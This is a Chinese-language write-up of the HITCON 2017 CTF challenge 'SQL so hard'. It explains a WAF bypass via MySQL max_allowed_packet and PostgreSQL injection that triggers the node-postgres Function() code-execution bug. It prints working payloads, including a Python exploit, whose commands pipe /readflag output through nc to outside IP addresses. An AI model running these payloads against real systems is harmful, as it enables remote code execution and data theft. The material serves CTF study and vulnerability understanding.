最近实在是太多事情了Orz，所以没有及时更新复现。。(其实是偷懒

分享自制Dockerfile：[Github](https://github.com/Pr0phet/hitcon2017Dockerfile/tree/master/hitcon-ctf-2017/sql-so-hard) 

这道题涉及到的知识点：

- mysql的*max_allowed_packet*
- node-postgresql的一个RCE
- postgresql中语句返回值的问题

本题连接了两个数据库 一个是mysql--用作waf之后ip和payload记录，另外一个是postgresql--用作注册时记录用户名称和密码

因为主要是分析大大的payload为主，这里的考察点主要是node-postgresql近期的一个RCE漏洞(https://node-postgres.com/announcements#2017-08-12-code-execution-vulnerability)

这个洞详细的分析P神已经在博客贴出来了(https://www.leavesongs.com/PENETRATION/node-postgres-code-execution-vulnerability.html)
并且复现环境p神也已经写了Dockerfile(https://github.com/vulhub/vulhub/tree/master/node/node-postgres)

简单来说就是客户端在获取表字段的时候因为转译不完全导致原本应该拼接在代码中的字段名被构造成了恶意代码传入了Function()这个类，这个类类似于PHP中的create_function，因为函数体可控 ,也就造成了命令执行。然后官方也有转译，但是官方的转译只是把**' --> \\'** ， 所以在前面加个\\就能逃逸出来（逃逸后的字符串就是 **\\\\'**）

所以这里的目的就很明确了 --> 通过postgresql的注入造成代码拼接命令执行
ß
但是会遇到两个问题：
1. 这里postgresql存在注入 但是首先得绕过一大堆关键字waf
2. 我们的ip不能在mysql留下记录 （这里的waf思路是如果有keyword则插入记录 后面再查询，如果有记录则拦截）

思路：
- 造成Mysql插入出错
提交一个很长很长的查询（默认包大小为16M），超出max_allowed_packet造成连接关闭，sql语句就不会执行 官方文档：![max_allowed_packet](http://upload-images.jianshu.io/upload_images/6949366-bb83cdbe939a1425.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
这样没有插入的话就不会查询到记录，即达到**绕过waf**的目的

- 或者使用postgreSQL支持将16进制的值转换成Unicode字符、并且可以自定义转译符的[特性](https://www.postgresql.org/docs/9.6/static/sql-syntax-lexical.html)来将关键字全部替换掉, 从而达到**绕过waf**的目的, Eg: 国外大佬的[wp](https://github.com/sorgloomer/writeups/blob/master/writeups/2017-hitcon-quals/sql-so-hard.md)(其中空格使用\t绕过,自定义转译符为感叹号)
```
','')\tON\tCONFLICT\t(username)\tDO\tUPDATE\tSET\tusername=''\tRETURNING\t1\tAS\tU&"!005c!0027+(r=process.mainModule.require,l=!0022!0022)]!002f!002f"\tUESCAPE\t'!',\t1\tAS\tU&"!005c!0027+(l+=!0022!002freadflag|nc!0020123.123!0022)]!002f!002f"\tUESCAPE\t'!',\t1\tAS\tU&"!005c!0027+(l+=!0022.123.123!00201234!0022)]!002f!002f"\tUESCAPE\t'!',\t1\tAS\tU&"!005c!0027+(r(!0022child_process!0022).execSync(l))]!002f!002f"\tUESCAPE\t'!';
```
- 构造RCE代码[2017-08-12 - code execution vulnerability](https://node-postgres.com/announcements#2017-08-12-code-execution-vulnerability)
目的是构造相应的字段名称造成RCE（详细原因请看P神关于漏洞的[分析](https://www.leavesongs.com/PENETRATION/node-postgres-code-execution-vulnerability.html)）
这里会出现新问题：
  - 不能控制insert的字段名，并且insert没有返回值(?)
  - 这里利用了分号切割sql语句，不能通过;闭合sql语句的方式构造RCE

这里阅读 [文档](https://www.postgresql.org/docs/9.5/static/dml-returning.html), postgresql允许在insert或者update后选择一个或多个字段返回, 所以在这里就有可控字段名了, 使用格式 ``insert into xx(aa,bb) values('cc','dd') returning  ee as ff;``
最后就是构造RCE中P神在博客中提到的
> 单双引号都不能正常使用，我们可以使用es6中的反引号
>``Function``环境下没有``require``函数, 不能获得``child_process``模块, 但是可以通过``process.mainModule.constructor._load``来代替require
> 一个fieldName只能有64位长度, 所以通过多个fieldName拼接来完成利用

最后是orange大大的exp:

```python
from random import randint
import requests

# payload = "union"
payload = """','')/*%s*/returning(1)as"\\'/*",(1)as"\\'*/-(a=`child_process`)/*",(2)as"\\'*/-(b=`/readflag|nc 10.188.2.20 9999`)/*",(3)as"\\'*/-console.log(process.mainModule.require(a).exec(b))]=1//"--""" % (' '*1024*1024*16)


username = str(randint(1, 65535))+str(randint(1, 65535))+str(randint(1, 65535))
data = {
            'username': username+payload, 
                'password': 'AAAAAA'
                }
print 'ok'
r = requests.post('http://10.188.2.20:12345/reg', data=data);
print r.content
```

参考:
https://github.com/orangetw/My-CTF-Web-Challenges
https://www.leavesongs.com/PENETRATION/node-postgres-code-execution-vulnerability.html
https://github.com/vulhub/vulhub/tree/master/node/node-postgres
https://www.postgresql.org/docs/9.6/static/sql-syntax-lexical.html
https://www.postgresql.org/docs/9.5/static/dml-returning.html
https://github.com/sorgloomer/writeups/blob/master/writeups/2017-hitcon-quals/sql-so-hard.md
https://node-postgres.com/announcements#2017-08-12-code-execution-vulnerability